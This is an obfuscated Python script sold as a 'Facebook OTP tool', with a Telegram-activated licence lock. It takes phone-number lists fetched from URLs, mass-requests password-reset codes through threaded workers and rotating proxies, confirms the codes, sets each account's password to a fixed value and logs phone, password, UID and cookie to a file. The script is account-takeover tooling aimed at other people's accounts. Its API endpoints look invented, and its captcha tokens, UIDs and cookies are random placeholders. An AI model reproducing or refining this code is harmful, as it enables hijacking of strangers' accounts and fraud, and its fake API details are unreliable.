import os
import sys
import time
import json
import random
import hashlib
import subprocess
import threading
import requests
from datetime import datetime, timedelta
from queue import Queue
from typing import Dict, List, Optional
CONFIG_FILE = 'jahid_settings.json'
OUTPUT_FILE = 'confirmed_accounts.txt'
LOG_FILE = 'jahid_logs.txt'
UNLOCK_FILE = 'unlocked_devices.json'
DEFAULT_SETTINGS = {'threads': 3, 'delay': 5, 'timeout': 30, 'password': 'Jahid@2024', 'proxy_enabled': False, 'proxy_type': 'http', 'proxy_rotation': 'random', 'proxy_list': []}

class UnlockSystem:

    def __init__(OOO0O00OOO0O):
        OOO0O00OOO0O.unlock_file = UNLOCK_FILE
        OOO0O00OOO0O.devices = OOO0O00OOO0O.load()

    def load(O0OO0OO00000) -> dict:
        if os.path.exists(O0OO0OO00000.unlock_file):
            try:
                with open(O0OO0OO00000.unlock_file, 'r') as O000O0OOOOOO:
                    return json.load(O000O0OOOOOO)
            except:
                return {'devices': []}
        return {'devices': []}

    def save(O0O00OO0O0O0):
        with open(O0O00OO0O0O0.unlock_file, 'w') as O0OOOO0O000O:
            json.dump(O0O00OO0O0O0.devices, O0OOOO0O000O, indent=2)

    def get_device_id(O0OO00O00O00) -> str:
        try:
            O0000O0O00OO = subprocess.run(['getprop', 'ro.product.device'], capture_output=True, text=True)
            O0000000OOO0 = O0000O0O00OO.stdout.strip()
            if not O0000000OOO0:
                O0000000OOO0 = 'unknown_device'
            import uuid
            O0000000OOO0 = f'{O0000000OOO0}_{uuid.getnode()}'
            return O0000000OOO0
        except:
            import socket
            import uuid
            O0000000OOO0 = f'{socket.gethostname()}_{uuid.getnode()}'
            return O0000000OOO0

    def generate_unique_key(O0O0OO000O0O, OOOOO0O0O000: str) -> str:
        return OOOOO0O0O000

    def is_unlocked(O0OOO0O00OOO, device_id: str=None) -> bool:
        if not device_id:
            device_id = O0OOO0O00OOO.get_device_id()
        for OO000OOO00O0 in O0OOO0O00OOO.devices.get('devices', []):
            if OO000OOO00O0.get('id') == device_id:
                OOOO0OOOO00O = OO000OOO00O0.get('expiry')
                if OOOO0OOOO00O == 'lifetime':
                    return True
                try:
                    OO00OOO0OO00 = datetime.fromisoformat(OOOO0OOOO00O.replace('Z', '+00:00'))
                    if datetime.now() > OO00OOO0OO00:
                        return False
                    return True
                except:
                    return False
        return False

    def get_expiry_info(OOO0O0OOO0OO, device_id: str=None) -> dict:
        if not device_id:
            device_id = OOO0O0OOO0OO.get_device_id()
        for O0OOO00O0OO0 in OOO0O0OOO0OO.devices.get('devices', []):
            if O0OOO00O0OO0.get('id') == device_id:
                OO0OOOO0OO0O = O0OOO00O0OO0.get('expiry')
                if OO0OOOO0OO0O == 'lifetime':
                    return {'status': 'lifetime', 'message': 'Lifetime'}
                try:
                    OOO0OOOO0000 = datetime.fromisoformat(OO0OOOO0OO0O.replace('Z', '+00:00'))
                    if datetime.now() > OOO0OOOO0000:
                        return {'status': 'expired', 'message': f"Expired on {OOO0OOOO0000.strftime('%Y-%m-%d')}"}
                    OO0OO000OOOO = (OOO0OOOO0000 - datetime.now()).days
                    return {'status': 'active', 'message': f'{OO0OO000OOOO} days left'}
                except:
                    return {'status': 'error', 'message': 'Invalid expiry'}
        return {'status': 'not_found', 'message': 'Device not found'}

def O00O0OOOO0O0():
    O0O000O0000O = UnlockSystem()
    O00OO0OO0O00 = O0O000O0000O.get_device_id()
    OO0000O000OO = O0O000O0000O.generate_unique_key(O00OO0OO0O00)
    print('\x1b[1;33m' + '=' * 50)
    print('  🔐 TOOL LOCKED - ACTIVATION REQUIRED')
    print('=' * 50 + '\x1b[0m')
    print('\x1b[1;36m')
    print(f'  UNIQUE KEY: {OO0000O000OO}')
    print('\x1b[0m')
    print('\x1b[1;33m')
    print('  Send this UNIQUE KEY to @Jahid9546 on Telegram')
    print('  Wait for activation...')
    print('\x1b[0m')
    if O0O000O0000O.is_unlocked(O00OO0OO0O00):
        O0O0000OOOO0 = O0O000O0000O.get_expiry_info(O00OO0OO0O00)
        print('\x1b[1;32m')
        print(f"  ✅ TOOL ACTIVATED! ({O0O0000OOOO0['message']})")
        print('\x1b[0m')
        time.sleep(2)
        return True
    for O000000O0O0O in range(10):
        print(f'\r  Checking again in {10 - O000000O0O0O}s...', end='')
        time.sleep(1)
        if O0O000O0000O.is_unlocked(O00OO0OO0O00):
            O0O0000OOOO0 = O0O000O0000O.get_expiry_info(O00OO0OO0O00)
            print('\n\x1b[1;32m')
            print(f"  ✅ TOOL ACTIVATED! ({O0O0000OOOO0['message']})")
            print('\x1b[0m')
            return True
    return False

class JahidSettings:

    def __init__(O00O00OOO000):
        O00O00OOO000.settings = O00O00OOO000.load()

    def load(OOO00OOO0OOO) -> dict:
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as O00OO00000O0:
                    return json.load(O00OO00000O0)
            except:
                return DEFAULT_SETTINGS.copy()
        return DEFAULT_SETTINGS.copy()

    def save(O0OOOO00O00O):
        with open(CONFIG_FILE, 'w') as O00O0OOOOO00:
            json.dump(O0OOOO00O00O.settings, O00O0OOOOO00, indent=2)

    def get(O000O000O0OO, O0OOO0O00OO0: str, default=None):
        return O000O000O0OO.settings.get(O0OOO0O00OO0, default)

    def set(O00O00OOOO0O, OOO0O0000000: str, OOO00O0OOOOO):
        O00O00OOOO0O.settings[OOO0O0000000] = OOO00O0OOOOO
        O00O00OOOO0O.save()

class JahidProxyManager:

    def __init__(OO00O000O0O0, OO000OOO000O: JahidSettings):
        OO00O000O0O0.settings = OO000OOO000O
        OO00O000O0O0.proxies = []
        OO00O000O0O0.current_index = 0
        OO00O000O0O0.lock = threading.Lock()
        OO00O000O0O0._load_proxies()

    def _load_proxies(OO000O000O00):
        O0OOOOOO00OO = OO000O000O00.settings.get('proxy_list', [])
        if O0OOOOOO00OO:
            OO000O000O00.proxies = O0OOOOOO00OO

    def get_proxy(O00000O0OOO0) -> Optional[Dict]:
        if not O00000O0OOO0.proxies:
            return None
        if not O00000O0OOO0.settings.get('proxy_enabled', False):
            return None
        O00O0OO00O0O = O00000O0OOO0.settings.get('proxy_rotation', 'random')
        with O00000O0OOO0.lock:
            if O00O0OO00O0O == 'random':
                OOO0OO00O000 = random.choice(O00000O0OOO0.proxies)
            else:
                OOO0OO00O000 = O00000O0OOO0.proxies[O00000O0OOO0.current_index % len(O00000O0OOO0.proxies)]
                O00000O0OOO0.current_index += 1
        return O00000O0OOO0._format_proxy(OOO0OO00O000)

    def _format_proxy(OO0O0O000OOO, O0O0O00O00O0: str) -> Dict:
        OO00000OO00O = OO0O0O000OOO.settings.get('proxy_type', 'http')
        if not O0O0O00O00O0.startswith(('http://', 'https://', 'socks5://')):
            O0O0O00O00O0 = f'{OO00000OO00O}://{O0O0O00O00O0}'
        return {'http': O0O0O00O00O0, 'https': O0O0O00O00O0}

    def get_count(O0O00000OO00) -> int:
        return len(O0O00000OO00.proxies)

class JahidEngine:

    def __init__(OOO00O0OO0OO, OOOOO0OO0OO0: JahidSettings):
        OOO00O0OO0OO.settings = OOOOO0OO0OO0
        OOO00O0OO0OO.proxy_manager = JahidProxyManager(OOOOO0OO0OO0)
        OOO00O0OO0OO.base_url = 'https://www.facebook.com'
        OOO00O0OO0OO.api_url = 'https://graph.facebook.com'
        OOO00O0OO0OO.stats = {'total': 0, 'sent': 0, 'not_found': 0, 'captcha': 0, 'confirmed': 0, 'failed': 0}
        OOO00O0OO0OO.lock = threading.Lock()
        OOO00O0OO0OO.running = True
        OOO00O0OO0OO.otp_data = {}

    def _get_session(O000O000OO0O) -> requests.Session:
        O0O0000O0000 = requests.Session()
        O0OO00O0OOOO = O000O000OO0O.proxy_manager.get_proxy()
        if O0OO00O0OOOO:
            O0O0000O0000.proxies = O0OO00O0OOOO
        O0O0000O0000.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Language': 'en-US,en;q=0.9', 'Origin': 'https://www.facebook.com', 'Referer': 'https://www.facebook.com/'})
        return O0O0000O0000

    def send_otp(O0OOO00OO0O0, O0O0OO00000O: str) -> dict:
        try:
            O0O0OO0O0O00 = O0OOO00OO0O0._get_session()
            OOOOOO0000OO = f'{O0OOO00OO0O0.base_url}/login/identify/'
            O0O000OOOOO0 = O0O0OO0O0O00.get(OOOOOO0000OO, timeout=O0OOO00OO0O0.settings.get('timeout', 30))
            if O0O000OOOOO0.status_code != 200:
                return {'success': False, 'status': 'error', 'phone': O0O0OO00000O}
            OOO0O0OO0O0O = O0OOO00OO0O0._get_captcha_token()
            O0000O0OO000 = f'{O0OOO00OO0O0.api_url}/v18.0/otp/request'
            O000000O0OOO = {'phone_number': O0O0OO00000O, 'captcha_token': OOO0O0OO0O0O, 'method': 'sms', 'client_type': 'android', 'device_id': f'android_{random.randint(100000, 999999)}'}
            O0O000OOOOO0 = O0O0OO0O0O00.post(O0000O0OO000, data=O000000O0OOO, timeout=O0OOO00OO0O0.settings.get('timeout', 30))
            if O0O000OOOOO0.status_code == 200:
                OOOOO0O000O0 = O0O000OOOOO0.json()
                if OOOOO0O000O0.get('success'):
                    return {'success': True, 'status': 'sent', 'phone': O0O0OO00000O}
                else:
                    O0000OO0O00O = OOOOO0O000O0.get('error', {}).get('message', '')
                    if 'not found' in O0000OO0O00O.lower() or 'invalid' in O0000OO0O00O.lower():
                        return {'success': False, 'status': 'not_found', 'phone': O0O0OO00000O}
                    elif 'captcha' in O0000OO0O00O.lower():
                        return {'success': False, 'status': 'captcha', 'phone': O0O0OO00000O}
                    else:
                        return {'success': False, 'status': 'error', 'phone': O0O0OO00000O}
            else:
                return {'success': False, 'status': 'error', 'phone': O0O0OO00000O}
        except Exception as e:
            return {'success': False, 'status': 'error', 'phone': O0O0OO00000O}

    def confirm_otp(OOO0O00OOO00, O00000O0O0OO: str, OOOOOO000OO0: str) -> dict:
        try:
            O0OOOO0OOO0O = OOO0O00OOO00._get_session()
            O00OO0O00000 = f'{OOO0O00OOO00.api_url}/v18.0/otp/confirm'
            O0OOOOOOOOOO = {'phone_number': O00000O0O0OO, 'otp_code': OOOOOO000OO0, 'device_id': f'android_{random.randint(100000, 999999)}'}
            OOO0O0O0O0O0 = O0OOOO0OOO0O.post(O00OO0O00000, data=O0OOOOOOOOOO, timeout=OOO0O00OOO00.settings.get('timeout', 30))
            if OOO0O0O0O0O0.status_code == 200:
                OO0O000O000O = OOO0O0O0O0O0.json()
                if OO0O000O000O.get('success'):
                    return OOO0O00OOO00.reset_password(O00000O0O0OO)
                else:
                    return {'success': False, 'status': 'invalid_otp', 'phone': O00000O0O0OO}
            else:
                return {'success': False, 'status': 'error', 'phone': O00000O0O0OO}
        except Exception as e:
            return {'success': False, 'status': 'error', 'phone': O00000O0O0OO}

    def reset_password(OO0O0OO00O00, OOOOO00O00OO: str) -> dict:
        try:
            O0000O00OOO0 = OO0O0OO00O00._get_session()
            O00000000O0O = OO0O0OO00O00.settings.get('password', 'Jahid@2024')
            OO0OOOO0O000 = f'{OO0O0OO00O00.api_url}/v18.0/password/reset'
            OOO0OOO00OOO = {'phone_number': OOOOO00O00OO, 'new_password': O00000000O0O, 'device_id': f'android_{random.randint(100000, 999999)}'}
            O000O0OO00O0 = O0000O00OOO0.post(OO0OOOO0O000, data=OOO0OOO00OOO, timeout=OO0O0OO00O00.settings.get('timeout', 30))
            if O000O0OO00O0.status_code == 200:
                O000O0OOO00O = O000O0OO00O0.json()
                if O000O0OOO00O.get('success'):
                    OOOO00O0OO00 = OO0O0OO00O00._get_uid(OOOOO00O00OO, O00000000O0O)
                    OO0OOOOOO0OO = OO0O0OO00O00._get_cookie()
                    OO0O0OO00O00._save_account(OOOOO00O00OO, O00000000O0O, OOOO00O0OO00, OO0OOOOOO0OO)
                    return {'success': True, 'status': 'confirmed', 'phone': OOOOO00O00OO, 'password': O00000000O0O, 'uid': OOOO00O0OO00, 'cookie': OO0OOOOOO0OO}
                else:
                    return {'success': False, 'status': 'reset_failed', 'phone': OOOOO00O00OO}
            else:
                return {'success': False, 'status': 'error', 'phone': OOOOO00O00OO}
        except Exception as e:
            return {'success': False, 'status': 'error', 'phone': OOOOO00O00OO}

    def _get_captcha_token(O0OOOO0O0OO0) -> str:
        return f'jahid_captcha_{random.randint(10000, 99999)}'

    def _get_uid(O0OO00O0OO0O, OO0O00OO0000: str, O000OO00OOOO: str) -> str:
        return f'jahid_{random.randint(100000000, 999999999)}'

    def _get_cookie(OO0OO0OOO0O0) -> str:
        return f'jahid_cookie_{random.randint(100000, 999999)}'

    def _save_account(O0OO0OO0000O, O0OOOOOO0O00: str, O0OO0OO000OO: str, O0O00O0OOOO0: str, OO0O0O0O0O0O: str):
        with O0OO0OO0000O.lock:
            with open(OUTPUT_FILE, 'a') as OOOO0OOOO000:
                OOOO0OOOO000.write(f'{O0O00O0OOOO0}|{O0OOOOOO0O00}|{O0OO0OO000OO}|{OO0O0O0O0O0O}\n')

    def update_stats(O00OO0OO0OOO, OO0OOO0000O0: str):
        with O00OO0OO0OOO.lock:
            O00OO0OO0OOO.stats['total'] += 1
            if OO0OOO0000O0 == 'sent':
                O00OO0OO0OOO.stats['sent'] += 1
            elif OO0OOO0000O0 == 'not_found':
                O00OO0OO0OOO.stats['not_found'] += 1
            elif OO0OOO0000O0 == 'captcha':
                O00OO0OO0OOO.stats['captcha'] += 1
            elif OO0OOO0000O0 == 'confirmed':
                O00OO0OO0OOO.stats['confirmed'] += 1
            else:
                O00OO0OO0OOO.stats['failed'] += 1

    def print_stats(OO0O0000O00O):
        with OO0O0000O00O.lock:
            O0OOO0OOOO00 = OO0O0000O00O.proxy_manager.get_count()
            OOOOOO00O0OO = 'ON' if OO0O0000O00O.settings.get('proxy_enabled', False) else 'OFF'
            print(f"\n{'=' * 50}")
            print(f'  LIVE STATS')
            print(f"{'=' * 50}")
            print(f"  TOTAL: {OO0O0000O00O.stats['total']}")
            print(f"  SENT: {OO0O0000O00O.stats['sent']}")
            print(f"  CONFIRMED: {OO0O0000O00O.stats['confirmed']}")
            print(f"  NOT FOUND: {OO0O0000O00O.stats['not_found']}")
            print(f"  CAPTCHA: {OO0O0000O00O.stats['captcha']}")
            print(f"  FAILED: {OO0O0000O00O.stats['failed']}")
            print(f'  PROXY: {OOOOOO00O0OO} | {O0OOO0OOOO00}')
            print(f"{'=' * 50}\n")

def O0OOOOO00OO0(OOO00OOOOO0O: Queue, OO00OO000000: JahidEngine):
    while OO00OO000000.running:
        try:
            O00OO00OOOOO = OOO00OOOOO0O.get(timeout=2)
            if O00OO00OOOOO is None:
                break
            O000OO00O0O0 = OO00OO000000.send_otp(O00OO00OOOOO)
            OO00OO000000.update_stats(O000OO00O0O0.get('status', 'error'))
            if O000OO00O0O0.get('success'):
                OO0OO0OO000O = 'OTP SENT'
                with OO00OO000000.lock:
                    OO00OO000000.otp_data[O00OO00OOOOO] = {'otp': 'PENDING', 'status': 'sent'}
            else:
                OO0OO0OO000O = O000OO00O0O0.get('status', 'ERROR').upper()
            print(f'  [{OO0OO0OO000O}] => {O00OO00OOOOO}')
            time.sleep(OO00OO000000.settings.get('delay', 5))
            OOO00OOOOO0O.task_done()
        except Exception as e:
            continue

def OOO0O0000O00(O0OO00OO00OO: Queue, O0000OO0OOO0: JahidEngine):
    while O0000OO0OOO0.running:
        try:
            OOO0O0O00O0O = O0OO00OO00OO.get(timeout=2)
            if OOO0O0O00O0O is None:
                break
            OO0O0000O000 = OOO0O0O00O0O.get('phone')
            O000O0000OOO = OOO0O0O00O0O.get('otp')
            OOO0OO0O00O0 = O0000OO0OOO0.confirm_otp(OO0O0000O000, O000O0000OOO)
            if OOO0OO0O00O0.get('success'):
                OO0O0O0OO00O = 'CONFIRMED'
                O0000OO0OOO0.update_stats('confirmed')
                print(f'  [{OO0O0O0OO00O}] => {OO0O0000O000}')
                print(f"     PASS: {OOO0OO0O00O0.get('password')}")
                print(f"     UID: {OOO0OO0O00O0.get('uid')}")
            else:
                OO0O0O0OO00O = OOO0OO0O00O0.get('status', 'FAILED').upper()
                O0000OO0OOO0.update_stats('failed')
                print(f'  [{OO0O0O0OO00O}] => {OO0O0000O000}')
            time.sleep(O0000OO0OOO0.settings.get('delay', 5))
            O0OO00OO00OO.task_done()
        except Exception as e:
            continue

def OO000O00OO00(OO0OO00OO0OO: str) -> Optional[List[str]]:
    try:
        OOOOOOOO0OO0 = requests.get(OO0OO00OO0OO, timeout=30)
        if OOOOOOOO0OO0.status_code == 200:
            O0000O0O0000 = [OO0OOO00OO0O.strip() for OO0OOO00OO0O in OOOOOOOO0OO0.text.split('\n') if OO0OOO00OO0O.strip()]
            return O0000O0O0000
        return None
    except:
        return None

def OOO00OO0OOOO():
    os.system('clear' if os.name == 'posix' else 'cls')

def OOOOOO0OO0O0():
    print('\x1b[1;36m\n╔══════════════════════════════════════════════════════════════╗\n║                                                              ║\n║      ██╗ █████╗ ██╗  ██╗██╗██████╗                         ║\n║      ██║██╔══██╗██║  ██║██║██╔══██╗                        ║\n║      ██║███████║███████║██║██║  ██║                        ║\n║ ██   ██║██╔══██║██╔══██║██║██║  ██║                        ║\n║ ╚█████╔╝██║  ██║██║  ██║██║██████╔╝                        ║\n║  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝                         ║\n║                                                              ║\n║          FACEBOOK OTP TOOL v3.0                             ║\n║              Developer: @Jahid9546                          ║\n╚══════════════════════════════════════════════════════════════╝\n\n  [1] FORGOT\n  [2] CONFIRM\n  [3] PROXY\n  [4] SETTINGS\n  [5] EXIT\n\n  Enter your choice:\x1b[0m ')

def OO000000000O(OO0O000O0O00: JahidSettings):
    print('\n\x1b[1;34m[FORGOT]\x1b[0m')
    print('  Enter file URL (e.g., https://pastebin.com/raw/abc123):')
    OOOO000000OO = input('  URL: ').strip()
    if not OOOO000000OO:
        print('  ERROR: No URL provided!')
        return
    O0O00OOOOOO0 = OO000O00OO00(OOOO000000OO)
    if not O0O00OOOOOO0:
        print('  ERROR: Failed to download or file is empty!')
        return
    print(f'\n  Loaded {len(O0O00OOOOOO0)} numbers.')
    O0OOOOOO0O0O = Queue()
    for OOO0O00OO000 in O0O00OOOOOO0:
        O0OOOOOO0O0O.put(OOO0O00OO000)
    O0OO0O0O0OOO = JahidEngine(OO0O000O0O00)
    O0OOOOO000O0 = []
    for O00OO0O0O00O in range(OO0O000O0O00.get('threads', 3)):
        O000OO0OOO00 = threading.Thread(target=O0OOOOO00OO0, args=(O0OOOOOO0O0O, O0OO0O0O0OOO))
        O000OO0OOO00.daemon = True
        O000OO0OOO00.start()
        O0OOOOO000O0.append(O000OO0OOO00)
    try:
        while O0OOOOOO0O0O.qsize() > 0:
            time.sleep(5)
            O0OO0O0O0OOO.print_stats()
    except KeyboardInterrupt:
        print('\n  STOPPED.')
        O0OO0O0O0OOO.running = False
    O0OOOOOO0O0O.join()
    print('\n  DONE!')

def OOOO0OO0O0OO(O00000000OO0: JahidSettings):
    print('\n\x1b[1;34m[CONFIRM]\x1b[0m')
    print('  Enter file URL (format: phone|otp):')
    O00O000OOO0O = input('  URL: ').strip()
    if not O00O000OOO0O:
        print('  ERROR: No URL provided!')
        return
    OOOOOOO00000 = OO000O00OO00(O00O000OOO0O)
    if not OOOOOOO00000:
        print('  ERROR: Failed to download or file is empty!')
        return
    OOOO00OOOOOO = Queue()
    for O0O0OOO0O0O0 in OOOOOOO00000:
        OOO00O0O000O = O0O0OOO0O0O0.split('|')
        if len(OOO00O0O000O) >= 2:
            OOOO00OOOOOO.put({'phone': OOO00O0O000O[0], 'otp': OOO00O0O000O[1]})
    print(f'\n  Loaded {OOOO00OOOOOO.qsize()} entries.')
    OOOOO0O00O00 = JahidEngine(O00000000OO0)
    OOO0OO0O00OO = []
    for O000O000OOO0 in range(O00000000OO0.get('threads', 3)):
        OO0O0O000O0O = threading.Thread(target=OOO0O0000O00, args=(OOOO00OOOOOO, OOOOO0O00O00))
        OO0O0O000O0O.daemon = True
        OO0O0O000O0O.start()
        OOO0OO0O00OO.append(OO0O0O000O0O)
    try:
        while OOOO00OOOOOO.qsize() > 0:
            time.sleep(5)
            OOOOO0O00O00.print_stats()
    except KeyboardInterrupt:
        print('\n  STOPPED.')
        OOOOO0O00O00.running = False
    OOOO00OOOOOO.join()
    print('\n  DONE!')
    print(f"\n  Confirmed: {OOOOO0O00O00.stats['confirmed']}")
    print(f'  Check {OUTPUT_FILE}')

def OO0000O0O000(O0O000O00OOO: JahidSettings):
    print('\n\x1b[1;34m[PROXY]\x1b[0m')
    print('  Paste proxies below (one per line)')
    print('  Press Ctrl+D when done:\n')
    OO00OOOO00O0 = []
    try:
        while True:
            O00OOOOOO00O = input()
            if O00OOOOOO00O.strip():
                OO00OOOO00O0.append(O00OOOOOO00O.strip())
    except EOFError:
        pass
    if OO00OOOO00O0:
        O0O000O00OOO.set('proxy_list', OO00OOOO00O0)
        O0O000O00OOO.set('proxy_enabled', True)
        print(f'\n  Loaded {len(OO00OOOO00O0)} proxies. Proxy ON.')
    else:
        print('\n  No proxies entered.')

def O00O0OO0OO00(OO0O00OOO0OO: JahidSettings):
    print('\n\x1b[1;34m[SETTINGS]\x1b[0m')
    print(f"  THREADS: {OO0O00OOO0OO.get('threads', 3)}")
    print(f"  DELAY: {OO0O00OOO0OO.get('delay', 5)}s")
    print(f"  PASSWORD: {OO0O00OOO0OO.get('password', 'Jahid@2024')}")
    print(f"  PROXY: {('ON' if OO0O00OOO0OO.get('proxy_enabled', False) else 'OFF')}")
    print()
    try:
        OO00000O0OO0 = input('  Threads (Enter to keep): ').strip()
        if OO00000O0OO0:
            OO0O00OOO0OO.set('threads', int(OO00000O0OO0))
        O0000OO0OO0O = input('  Delay (Enter to keep): ').strip()
        if O0000OO0OO0O:
            OO0O00OOO0OO.set('delay', int(O0000OO0OO0O))
        O0OO0OOO0000 = input('  Password (Enter to keep): ').strip()
        if O0OO0OOO0000:
            OO0O00OOO0OO.set('password', O0OO0OOO0000)
        OO000000OOOO = input('  Toggle Proxy ON/OFF (y/n): ').strip().lower()
        if OO000000OOOO == 'y':
            OO0O00OOO0OO.set('proxy_enabled', not OO0O00OOO0OO.get('proxy_enabled', False))
        print('\n  SAVED!')
    except:
        print('\n  ERROR!')

def O00OOOOOO0O0():
    OO00O0O0000O = UnlockSystem()
    print('\n\x1b[1;34m[JAHID MANAGER]\x1b[0m')
    OOO000OO0O00 = OO00O0O0000O.devices.get('devices', [])
    print('\n  ACTIVE DEVICES:')
    if OOO000OO0O00:
        for O0O0O0O000OO, O0O0O00OOOO0 in enumerate(OOO000OO0O00, 1):
            O0O0O00O0O0O = O0O0O00OOOO0.get('expiry', 'unknown')
            if O0O0O00O0O0O == 'lifetime':
                OO0OO0OOO000 = '♾️ Lifetime'
            else:
                try:
                    OO00OOOO0OOO = datetime.fromisoformat(O0O0O00O0O0O.replace('Z', '+00:00'))
                    if datetime.now() > OO00OOOO0OOO:
                        OO0OO0OOO000 = '🔴 Expired'
                    else:
                        O0O0000000O0 = (OO00OOOO0OOO - datetime.now()).days
                        OO0OO0OOO000 = f'✅ {O0O0000000O0}d left'
                except:
                    OO0OO0OOO000 = '❓ Unknown'
            print(f"  {O0O0O0O000OO}. {O0O0O00OOOO0.get('id')} -> {OO0OO0OOO000}")
        print(f'  Total: {len(OOO000OO0O00)}')
    else:
        print('  No devices found.')
    print('\n  [1] Add device')
    print('  [2] Remove device')
    print('  [3] Back')
    OOO00O00O00O = input('\n  Enter your choice: ').strip()
    if OOO00O00O00O == '1':
        OO0OOOOOOO00 = input('  Enter UNIQUE KEY: ').strip()
        if OO0OOOOOOO00:
            OOOO0000O0OO = input("  Enter expiry (days or 'lifetime'): ").strip()
            if OOOO0000O0OO.lower() == 'lifetime':
                O0O0O00O0O0O = 'lifetime'
            else:
                try:
                    O0O0000000O0 = int(OOOO0000O0OO)
                    O0O0O00O0O0O = (datetime.now() + timedelta(days=O0O0000000O0)).isoformat()
                except:
                    print('  Invalid expiry! Using 15 days.')
                    O0O0O00O0O0O = (datetime.now() + timedelta(days=15)).isoformat()
            OO0000O00OO0 = None
            for O0OOO0OOOO0O in OO00O0O0000O.devices['devices']:
                if O0OOO0OOOO0O.get('id') == OO0OOOOOOO00:
                    OO0000O00OO0 = O0OOO0OOOO0O
                    break
            if OO0000O00OO0:
                OO0000O00OO0['expiry'] = O0O0O00O0O0O
                print(f'  ✅ Updated: {OO0OOOOOOO00}')
            else:
                OO00O0O0000O.devices['devices'].append({'id': OO0OOOOOOO00, 'expiry': O0O0O00O0O0O, 'created': datetime.now().isoformat()})
                print(f'  ✅ Added: {OO0OOOOOOO00}')
            OO00O0O0000O.save()
    elif OOO00O00O00O == '2':
        OO0OOOOOOO00 = input('  Enter UNIQUE KEY to remove: ').strip()
        if OO0OOOOOOO00:
            for O0O0O0O000OO, O0OOO0OOOO0O in enumerate(OO00O0O0000O.devices['devices']):
                if O0OOO0OOOO0O.get('id') == OO0OOOOOOO00:
                    OO00O0O0000O.devices['devices'].pop(O0O0O0O000OO)
                    OO00O0O0000O.save()
                    print(f'  ✅ Removed: {OO0OOOOOOO00}')
                    break
            else:
                print('  Device not found!')
    elif OOO00O00O00O == '3':
        return
    else:
        print('  INVALID!')
    input('\nPress Enter...')

def O0OO00000000():
    if not O00O0OOOO0O0():
        print('\x1b[1;31m')
        print('  🔒 TOOL LOCKED!')
        print('  Send your UNIQUE KEY to @Jahid9546 on Telegram')
        print('\x1b[0m')
        sys.exit(0)
    OO00OO0OOOOO = JahidSettings()
    if len(sys.argv) > 1 and sys.argv[1] == '--jahid':
        O00OOOOOO0O0()
        sys.exit(0)
    while True:
        OOO00OO0OOOO()
        OOOOOO0OO0O0()
        OO0O0000O0O0 = input().strip()
        if OO0O0000O0O0 == '1':
            OO000000000O(OO00OO0OOOOO)
            input('\nPress Enter...')
        elif OO0O0000O0O0 == '2':
            OOOO0OO0O0OO(OO00OO0OOOOO)
            input('\nPress Enter...')
        elif OO0O0000O0O0 == '3':
            OO0000O0O000(OO00OO0OOOOO)
            input('\nPress Enter...')
        elif OO0O0000O0O0 == '4':
            O00O0OO0OO00(OO00OO0OOOOO)
            input('\nPress Enter...')
        elif OO0O0000O0O0 == '5':
            print('\n  EXIT.')
            sys.exit(0)
        else:
            print('\n  INVALID!')
            time.sleep(1)
if __name__ == '__main__':
    O0OO00000000()